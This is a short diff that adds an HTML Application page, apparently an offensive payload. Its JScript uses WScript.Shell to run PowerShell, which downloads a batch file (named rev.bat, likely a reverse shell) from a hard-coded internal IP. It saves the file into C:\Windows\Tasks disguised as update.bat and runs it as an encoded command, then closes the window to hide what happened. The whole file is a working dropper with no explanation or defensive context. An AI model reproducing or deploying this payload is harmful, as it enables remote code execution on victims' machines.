@@ -1,0 +1,13 @@
+<html>
+<head>
+<script language="JScript">
+    var shell = new ActiveXObject("WScript.Shell");
+    var res = shell.Run("powershell iwr -uri http://192.168.31.200/rev.bat -outfile c:\\Windows\\Tasks\\update.bat;powershell -encodedCommand (Get-content 'c:\\Windows\\Tasks\\update.bat' -raw)");
+</script>
+</head>
+<body>
+    <script language="JScript">
+        self.close();
+    </script>
+</body>
+</html>
